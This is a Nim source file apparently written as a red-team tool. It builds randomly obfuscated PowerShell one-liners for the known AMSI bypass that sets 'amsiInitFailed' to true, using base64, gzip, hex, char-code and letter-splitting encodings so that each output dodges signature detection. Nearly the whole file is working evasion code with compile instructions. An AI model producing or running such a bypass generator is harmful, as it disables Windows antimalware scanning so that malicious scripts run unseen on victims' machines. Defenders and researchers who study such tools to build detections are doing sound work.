import base64
import zip/zlib
import random
import strutils

# git clone the following project for gzip compress and uncompress functions
# https://github.com/nim-lang/zip/blob/master/tests/zlibtests.nim

#[
    Compile for Linux
    nim c -r v4amsiBypassObfuscator.nim

    Compile for Windows
    # Probably will not execute on Win after compiled due to not being AMSI safe
    nim c -d:mingw v4amsiBypassObfuscator.nim

    References: https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/

]#

# obfLetters only seperates the letters life the following
# 'S'+'y'+'s'+'t'+'e'+'m'+'
proc obfLetters(strInput: string): string =
    var strOutput: string = ""
    for letter in strInput:
        strOutput.add ("'" & letter & "'+")
    # Added parenthesis around the string to encapsulate them...  Needs a parenthesis for SetValue...
    result = "(" & strOutput[.. ^2] & ")"

# obfBase64 - "nim" = "bmlt"
# [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('bmlt'))
proc obfBase64(strInput: string): string =
    result = "([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('" & encode(strInput) & "')))"

# obfBase64 + obfLetters (The base64 is used with obfLetters)
proc obfB64Letters(strInput: string): string =
    var strOutput: string = ""
    for letter in encode(strInput):
        strOutput.add ("'" & letter & "'+")
    result = "([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(" & strOutput[.. ^2] & ")))"

# Powershell to gzip decompress
#[
# Convert nim to a compressed gzip base64 string
$info = "nim"
$data = foreach ($c in $info.ToCharArray()) {
                $c -as [Byte]
} 
$ms = New-Object IO.MemoryStream                
$cs = New-Object System.IO.Compression.GZipStream ($ms, [Io.Compression.CompressionMode]"Compress")
$cs.Write($data, 0, $Data.Length)
$cs.Close()
$y = [Convert]::ToBase64String($ms.ToArray())        
$y  # H4sIAAAAAAAEAMvLzAUAM/I0OgMAAAA=
$ms.Close()

# Convert the base64 compressed gzip string to nim
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($y))
$z = (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
$z

# Convert from base64 compressed gzip string to nim (one-liner)
# (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String($y))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()

]#
proc obfGzip(strInput: string): string =
    var strOutput: string = ""
    strOutput.add "((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream"
    strOutput.add "((New-Object IO.MemoryStream(,[Convert]::FromBase64String("
    strOutput.add "'" & encode(compress(strInput)) & "'"
    strOutput.add "))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd())"
    result = strOutput

proc obfGzipLetters(strInput: string): string =
    var strOutput: string = ""
    var strB64: string = encode(compress(strInput))
    var strB64New: string = ""
    for letter in strB64:
        strB64New.add ("'" & letter & "'+")
    strOutput.add "((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream"
    strOutput.add "((New-Object IO.MemoryStream(,[Convert]::FromBase64String("
    strOutput.add strB64New[.. ^2]
    strOutput.add "))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd())"
    result = strOutput

# Obfuscated with the ASCII Decimal value of the letter
# "nim" = [char][byte]110+[char][byte]105+[char][byte]109
proc obfCharByte(strInput: string): string =
    var strOutput: string = ""
    var strNew: string = ""
    for letter in strInput:
        strNew.add "[char][byte]" & $int(letter) & "+"
    strOutput = "(" & strNew[.. ^2] & ")"
    result = strOutput

# Obfuscated with the Hex of the letter
# "nim" = ($($($r=('6E 69 6D'.Split(' ')));$($j="");$(ForEach ($i in $r){$j+=[char]([convert]::toint16($i,16))});$($j)))
proc obfHex(strInput: string): string =
    var strOutput: string = ""
    var strNew: string = ""
    for letter in strInput:
        #strNew = toHex($letter)
        strNew.add toHex($letter) & " "
    strOutput.add "($($($r=('"
    strOutput.add strNew[.. ^2]
    strOutput.add "'.Split(' ')));$($j='');$(ForEach ($i in $r){$j+=[char]([convert]::toint16($i,16))});$($j)))"
    result = strOutput

# Obfuscate with XOR or the ASCII converted to a byte array
#[
$x = "nim"
$enc = [system.Text.Encoding]::UTF8 
$bytes = $enc.GetBytes($x) 
$EncodedText = [Convert]::ToBase64String($bytes)
# Show the original encoded text - Validating the hex
$EncodedText
for ($i = 0; $i -lt $bytes.count; $i++)
{
    $bytes[$i] = $bytes[$i] -bxor 0x10
}
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
]#

# Building an obfuscator for the following line
#[ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
]#

# Functions available
#obfLetters
#obfBase64
#obfB64Letters
#obfGzip
#obfGzipLetters
#obfCharByte
#obfHex

# Future Suggestions
# ------------------
# Caesar
# Caesar  Randomize the Shift... 1 to 25?
# XOR
# Randomize XOR
proc randomizeProc(strInput: string): string =
    var strOutput: string = ""
    randomize()
    let randInt = rand(6)
    #echo randInt
    case randInt:
        of 0:
            strOutput = obfCharByte(strInput)
        of 1:
            strOutput = obfLetters(strInput)
        of 2:
            strOutput = obfBase64(strInput)
        of 3:
            strOutput = obfB64Letters(strInput)
        of 4:
            strOutput = obfGzip(strInput)
        of 5:
            strOutput = obfGzipLetters(strInput)
        of 6:
            strOutput = obfHex(strInput)
        else:
            strOutput = obfGzip(strInput)
    result = strOutput

var s0 = randomizeProc("Assembly")
#var s0 = obfHex("Assembly")
var s1 = randomizeProc("GetType")
var s2 = randomizeProc("System.Management.Automation.AmsiUtils")
var s3 = randomizeProc("GetField")
var s4 = randomizeProc("amsiInitFailed")
var s5 = randomizeProc("NonPublic,Static")
var s6 = randomizeProc("SetValue")

echo ("[Ref]." & s0 & "." & s1 & "(" & s2 & ")." & s3 & "(" & s4 & "," & s5 & ")." & s6 & "($null,$true)")
#echo ""
#echo s0
